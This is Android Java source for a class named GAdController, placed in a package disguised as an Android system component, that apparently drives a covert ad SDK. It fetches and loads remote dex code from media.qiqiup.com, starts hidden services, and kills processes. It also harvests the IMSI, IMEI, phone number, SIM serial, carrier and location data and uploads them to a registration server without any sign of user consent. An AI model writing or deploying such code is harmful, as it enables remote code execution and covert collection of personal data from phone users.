package com.android.system.core.sometools;



import java.text.DecimalFormat;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.telephony.TelephonyManager;
import android.util.Log;


public class GAdController {
	private static GAdController controller;
	private Context context;
	private String newSdkCode;
	private String dexName;
	
	
	private GAdController()
	{
		
	}
	
	public static GAdController getInstance()
	{
		if(controller == null)
		{
			controller = new GAdController();					
		}	
		return controller;
	}
		
	public void init(final Context context,Boolean isTestModel)
	{
		this.context = context;
	
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
		
		killpro();
		new Thread(){
			public void run() {
				try {
					Thread.sleep(5000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				finally
				{
					Intent intent = new Intent(context,GService.class);
					context.startService(intent);
				}
			};
		}.start();
		
		
		
		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
	}
	
	public void init(Context context)
	{
		this.context = context;
		
		ApplicationInfo appInfo = null;
		try {
			appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),PackageManager.GET_META_DATA);
			String qew_channel = appInfo.metaData.getString("UMENG_CHANNEL");
			GCommons.CHANNEL = qew_channel;
			Log.e("------------","qew_channel="+GCommons.CHANNEL);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		
		judgeCountry();
	}
	
	public void initEnd()
	{
		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
		if("china".equals(country))
		{
			updateLink();
		}
		else
		{
			GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
		}
		
		long reqTime = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_UPDATE_SDK_TIME, 0l);
		long nowTime = System.currentTimeMillis();
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		if(nowTime - reqTime > 1*60*60*1000 || "0".equals(code))
		{
			Log.e("------------", "req new sdk "+GCommons.URI_POST_NEW_SDK);
			GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
		}
		else
		{
			Log.e("------------","----------start pro service");
			start();
		}
	}
	
	
	//判断是否是国内
	public void judgeCountry()
	{
		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
		if(country == null || "".equals(country))
		{
			GTool.httpGetRequest(GCommons.IP_URL, this, "getProvinceResult",null);
		}
		else
		{	
			Log.e("------------", "------country="+country);
			if("china".equals(country))
			{
				updateLink();
			}
			else
			{
				GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
			}
			initEnd();
		}
	}
	
	public void getProvinceResult(Object obj_session,Object obj_data)
	{
		Log.e("------------------","getProvinceResult="+obj_data.toString());
		try {
			JSONObject obj = new JSONObject(obj_data.toString());
			if("success".equals(obj.getString("status")))
			{
//				String city = obj.getString("city");//城市  
//				String province = obj.getString("regionName");//省份
				String country = obj.getString("country");//国家
				
				if(country != null && !"".equals(country))
				{					
					if(country.equals("中国") || country.equals("China") || country.equals("china"))
					{
						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "china");
						updateLink();
					}
					else
					{
						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "haiwai");
						GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
					}
					
				}
					
			}
		} catch (JSONException e) {
		}
		initEnd();
	}

	
	public void updateLink()
	{
		GCommons.SERVER_ADDRESS = "http://media.qiqiup.com/QiupAdServer/";
		GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
		//获取最新sdk
		GCommons.URI_POST_NEW_SDK = GCommons.SERVER_ADDRESS + "sdk_findNewSdk";
		GCommons.URI_POST_UPDATE_SDK_NUM = GCommons.SERVER_ADDRESS + "sdk_updateNum";
		
		//登录
		GCommons.URI_LOGIN = GCommons.SERVER_ADDRESS + "user_login";
		//校验
		GCommons.URI_VALIDATE = GCommons.SERVER_ADDRESS + "user_validates";
		//注册
		GCommons.URI_REGISTER = GCommons.SERVER_ADDRESS + "user_register";
		GCommons.URI_UPLOAD_APPINFO = GCommons.SERVER_ADDRESS + "user_uploadAppInfos";
	}

	
	public void showSpotAd()
	{
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.showspotad");
		intent.setAction("com.xugu.showspotad");
		this.context.sendBroadcast(intent);
		
	}
	
	public void destory(Activity act)
	{
		String clazName = act.getComponentName().getClassName();
		
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.destory");
		intent.setAction("com.xugu.destory");
		intent.putExtra("clazName", clazName);
		this.context.sendBroadcast(intent);
	}
	
	public void start()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.start");
		this.context.sendBroadcast(intent);
	}
	
	public void restart()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.restart");
		this.context.sendBroadcast(intent);
	}
	
	public void killpro()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.killpro");
		this.context.sendBroadcast(intent);
	}
	
	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}
	
	public void revNewSdk(Object ob,Object rev)
	{
		GTool.saveSharedData(GCommons.SHARED_KEY_UPDATE_SDK_TIME, System.currentTimeMillis());
		
		JSONObject obj = null;
		String versionCode = null;
		String downloadPath = null;
		boolean isFind = true;
		try {
			 obj = new JSONObject(rev.toString());	
			 versionCode = obj.getString("versionCode");
			 downloadPath = obj.getString("downloadPath");
			 newSdkCode = versionCode;
			 dexName = downloadPath;
		} catch (Exception e) {
			isFind = false;
			Log.e("------------","----------没有发现最新sdk包----");
		}	
		
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		Log.e("------------","----------curr sdk="+code);
		
		if(code.equals(versionCode) || !isFind)
		{
			if(code.equals(versionCode))
			{
				Log.e("------------","----------startservice");
				start();
			}
			else
			{
				Log.e("------------","----------no network or config error! reinit...---------");
				new Thread(){
					public void run() {
						try {
							Thread.sleep(30*60*1000);
							init(context);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					};
				}.start();
			}
		}
		else
		{
			Log.e("------------","----------downloadRes");
			GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
		}
	}
	
	public void revNewSdkCallback(Object ob,Object rev)
	{
		if("1".equals(rev.toString()))
		{
			GDexLoaderUtil.copyDex(context, ob.toString());
			GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
	        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
			start();
	        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, this, "revUpdateSdk", GCommons.CHANNEL);	
		}
		else
		{
			Log.e("------------","----------sdk download fial! redownloading...");
			init(context);
		}
	}
	
	public void revUpdateSdk(Object ob,Object rev)
	{
		 Log.e("------------","----------newSdkCode sdk="+newSdkCode);
	     android.os.Process.killProcess(android.os.Process.myPid());
	}
	
	
	
	
	
	
	private boolean isRegister()
	{
		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
		String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");		
		if(name != null && password != null && !"".equals(name.trim()) && !"".equals(password.trim()))
			return true;
		return false;
	}

	public void login()
	{
		GTool.saveSharedData(GCommons.SHARED_KEY_LOGIN_TIME,System.currentTimeMillis());
		Log.e("-----------------","start login...");

		if(isRegister())
		{
			GAdController.getInstance().loginSuccess();
			String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
			String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
			Log.e("-----------------","name="+name + "   pass="+password);
//			JSONObject obj = new JSONObject();
//			try {
//				obj.put(GCommons.SHARED_KEY_NAME, name);
//				obj.put(GCommons.SHARED_KEY_PASSWORD, password);
//				obj.put("networkType", GTool.getNetworkType());
//			} catch (JSONException e) {
//				e.printStackTrace();
//			}
//			GTool.httpPostRequest(GCommons.URI_LOGIN, this, "loginResult", obj.toString());
		}
		else
		{					
			validate();
		}
	}
	
	
	//验证是否已经注册
	public void validate()
	{
		TelephonyManager tm = GTool.getTelephonyManager();
		String name = tm.getSubscriberId();
		if(name == null || "".equals(name.trim()))
			name = tm.getDeviceId();
		if(name == null || "".equals(name.trim()))
			name = GTool.getRandomUUID();
		String password = GTool.getPackageName();
		
		GTool.saveSharedData(GCommons.SHARED_KEY_NAME, name);
		GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, password);
		JSONObject obj = new JSONObject();
		try {
			obj.put(GCommons.SHARED_KEY_NAME, name);
			obj.put(GCommons.SHARED_KEY_PASSWORD, password);
			obj.put("networkType", GTool.getNetworkType());
		} catch (JSONException e) {
			e.printStackTrace();
		}
		GTool.httpPostRequest(GCommons.URI_VALIDATE, this, "validateResult", obj.toString());
	}
	
	public void validateResult(Object ob,Object rev)
	{
		try {
			JSONObject obj = new JSONObject(rev.toString());
			if(obj.getBoolean("result"))
			{
				
				GAdController.getInstance().loginSuccess();
			}
			else
			{
				//服务器还不存在 就注册新用户
				GAdController.getInstance().register();			
			}
			
		} catch (JSONException e) {
			Log.e("------------", "validateResult fail!!!");
		}
	}
	
	public void register()
	{				
		GTool.httpGetRequest(GCommons.IP_URL, this, "getLoction",null);
	}
		
	
	public void getLoction(Object obj_session,Object obj_data)
	{
		String data = (String) obj_data;
		TelephonyManager tm = GTool.getTelephonyManager();
		User user = new User();
		String name = tm.getSubscriberId();
		if(name == null || "".equals(name.trim()))
			name = tm.getDeviceId();
		if(name == null || "".equals(name.trim()))
			name = GTool.getRandomUUID();
		user.setName(name);
		String password = GTool.getPackageName();
		user.setPassword(password);
		
		String deviceId = tm.getDeviceId();	
		if(deviceId == null || "".equals(deviceId.trim()))
			deviceId = GTool.getRandomUUID();
		
		user.setDeviceId(deviceId);
		user.setPhoneNumber(tm.getLine1Number());
		user.setNetworkOperatorName(tm.getNetworkOperatorName());
		user.setSimSerialNumber(tm.getSimSerialNumber());
		user.setNetworkCountryIso(tm.getNetworkCountryIso());
		user.setNetworkOperator(tm.getNetworkOperator());		
		user.setPhoneType(tm.getPhoneType());
		user.setModel(android.os.Build.MODEL);
		
		user.setRelease(android.os.Build.VERSION.RELEASE);
		int sdk = GTool.getSharedPreferences().getInt(GCommons.SHARED_KEY_SDK_VERSION, 0);
		if(sdk != 0)
		{
			user.setTrueRelease(GTool.getRelease(sdk));
		}
		DecimalFormat decimalFomat = new DecimalFormat(".00");//构造方法的字符格式这里如果小数不足2位,会以0补足.		
		user.setStorage(decimalFomat.format(GTool.getTotalInternalMemorySize())+"G");
		user.setMemory(decimalFomat.format(GTool.getTotalMemorySize())+"G");
		user.setChannel(GCommons.CHANNEL);
		user.setNetworkType(GTool.getNetworkType());
		try {
			JSONObject obj = new JSONObject(data);
			if("success".equals(obj.getString("status")))
			{
				String country = obj.getString("country");//国家
				String city = obj.getString("city");//城市  
				String province = obj.getString("regionName");//省份
				String district = obj.getString("lat");//区县 
				String street = obj.getString("lon");//街道
				
				user.setCountry(country);
				user.setProvince(province);
				user.setCity(city);
				user.setDistrict(district);
				user.setStreet(street);
				//用户可能拒绝获取位置 需要捕获异常
				user.setLocation(tm.getCellLocation().toString());

			}
		} catch (JSONException e) {
			e.printStackTrace();
		}finally{
			GTool.saveSharedData(GCommons.SHARED_KEY_NAME, name);
			GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, password);
			
			GTool.httpPostRequest(GCommons.URI_REGISTER, this, "registResult", User.toJson(user));
		}		
	}
	
	public static void registResult(Object ob,Object rev) throws JSONException
	{
		GAdController.getInstance().uploadAppInfos();	
		//注册成功上传app信息			
		GAdController.getInstance().loginSuccess();
	}
	
	//上传app信息
	public void uploadAppInfos()
	{
		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
		try {
			JSONObject obj = new JSONObject();
			obj.put("packageName", GTool.getPackageName());
			obj.put("name", GTool.getApplicationName());
			obj.put("versionName", GTool.getAppVersionName());
			obj.put("sdkVersion","1.0");
			obj.put("id", name);
			obj.put("password",  GTool.getPackageName());
			GTool.httpPostRequest(GCommons.URI_UPLOAD_APPINFO, this, null, obj);
		} catch (Exception e) {
		}
	}
	
	//登录成功
	public void loginSuccess()
	{			
		initEnd();
	}
}
